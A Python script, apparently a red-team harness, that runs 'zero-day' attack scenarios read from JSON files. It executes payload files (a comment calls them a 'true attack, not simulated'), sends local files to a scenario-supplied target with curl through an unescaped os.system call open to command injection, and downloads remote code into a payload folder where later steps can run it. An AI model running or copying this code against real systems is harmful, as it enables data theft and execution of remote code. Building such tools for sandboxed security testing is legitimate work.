import os
import subprocess
import json
from datetime import datetime

SCENARIO_DIR = os.path.abspath("./scenarios/zero_day/")
PAYLOAD_DIR = os.path.abspath("./payloads/zero_day/")
LOG_DIR = os.path.abspath("./staging/zero_day_logs/")

os.makedirs(LOG_DIR, exist_ok=True)

def run_zero_day_scenario(scenario_file):
    with open(os.path.join(SCENARIO_DIR, scenario_file), "r") as f:
        scenario = json.load(f)
    run_id = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_file = os.path.join(LOG_DIR, f"{os.path.splitext(scenario_file)[0]}_{run_id}.log")
    results = []
    for step in scenario:
        output = ""
        try:
            if step["action"] == "execute_payload":
                payload_path = os.path.join(PAYLOAD_DIR, step["data"]["payload_file"])
                # Execute in a subprocess for isolation (true attack, not simulated)
                out = subprocess.run(
                    ["python3", payload_path],
                    capture_output=True,
                    timeout=45
                )
                output = out.stdout.decode() + out.stderr.decode()
            elif step["action"] == "exfil":
                # Real exfil: Attempts outbound network call with artifacts (test in a sandbox!)
                files = step["data"].get("files", [])
                for f in files:
                    if os.path.exists(f):
                        os.system(f"curl -X POST --data-binary @{f} {step['data']['target']} --max-time 5")
                output = f"Exfiltration attempted to {step['data']['target']} for files: {files}"
            elif step["action"] == "ssrf_fetch_payload":
                # Attempts SSRF-style fetch and write to payloads dir (mimics real SSRF)
                import requests
                url = step["data"]["url"]
                resp = requests.get(url, timeout=10)
                fetched_path = os.path.join(PAYLOAD_DIR, "fetched_payload.py")
                with open(fetched_path, "wb") as ff:
                    ff.write(resp.content)
                output = f"Payload fetched from {url} and written to {fetched_path}"
        except Exception as e:
            output = f"Error: {e}"
        results.append({
            "step": step["action"],
            "details": output
        })
    with open(log_file, "w") as f:
        json.dump(results, f, indent=2)
    print(f"[OK] Results logged to {log_file}")

if __name__ == "__main__":
    # Run all scenarios in folder (can target one by name if desired)
    for scenario_file in os.listdir(SCENARIO_DIR):
        if scenario_file.endswith(".json"):
            run_zero_day_scenario(scenario_file)
